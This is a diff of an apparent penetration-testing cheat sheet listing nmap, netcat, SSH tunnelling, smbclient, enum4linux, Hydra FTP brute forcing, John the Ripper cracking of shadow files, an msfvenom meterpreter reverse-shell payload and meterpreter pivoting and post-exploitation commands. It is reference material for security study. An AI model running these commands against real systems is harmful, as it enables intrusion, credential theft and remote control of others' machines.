@@ -4,6 +4,8 @@
 sudo openvpn
 
 
+---------------------------------
+
 
 # Terminator keybinds 
 
@@ -29,6 +31,7 @@ ctrl + 0
 ctrl + shift + Z
 
 
+---------------------------------
 
 
 # Typical nmap commands 
@@ -51,6 +54,8 @@ nmap -T4 -O -sV -sC
 nmap -sU -p 161,162 
 
 
+---------------------------------
+
 
 # add/view routes and network connections
 
@@ -63,6 +68,13 @@ ip route add <targetIP> via <gateway>
 arp   (show the ARP cache)
 
 netstat
+
+
+//this scan runs from an exploited machine to avoid IDS and firewalls, to
+discover other hosts of an internal network. Run in meterpreter
+run arp_scanner -r 10.10.10.0/24 
+
+---------------------------------
 
 
 # Netcat commands
@@ -78,11 +90,16 @@ nc -w 3 [target] 1234 < output.file
 
 
 
+---------------------------------
+
+
 # grep for searching through large files
 
 grep -i "string goes here" filename.txt
 
 
+
+---------------------------------
 
 
 
@@ -93,10 +110,16 @@ ssh -L localport:target:remoteport Name@sshserver.com
 
 
 
+---------------------------------
+
+
 # smbclient
 
 smbclient \\\\targetmachine\\some-share -U username
 
+
+
+---------------------------------
 
 
 # MSF Venom/BufferOverflow
@@ -115,9 +138,15 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f py -b "\x00
 
 
 
+---------------------------------
+
+
 # Hydra FTP brute forcing
 
 hydra -t 20  -l /home/kali/Desktop/userslist -P /home/kali/Desktop/password.txt -vV <targetIP> ftp
+
+
+---------------------------------
 
 
 # John The Ripper password cracking 
@@ -133,11 +162,17 @@ unshadow [passwdfile] [shadowfile] > [output file name]
 john --wordlist=/usr/share/john/password.lst [output file name]
 
 
+---------------------------------
+
+
 # enum4linux 
 
 
 enum4linux.pl -a <targetIP> | tee enum4linux.log
 
+
+
+---------------------------------
 
 
 # PowerShell
@@ -168,9 +203,17 @@ powershell folder
 
 
 
+---------------------------------
+
+
+
 # Meterpreter 
 
 search -d /pathtobeginsearch -f *.extension
 
 //helpful post-exploit enum scripts here
 run post/windows/gather/
+
+
+
+---------------------------------
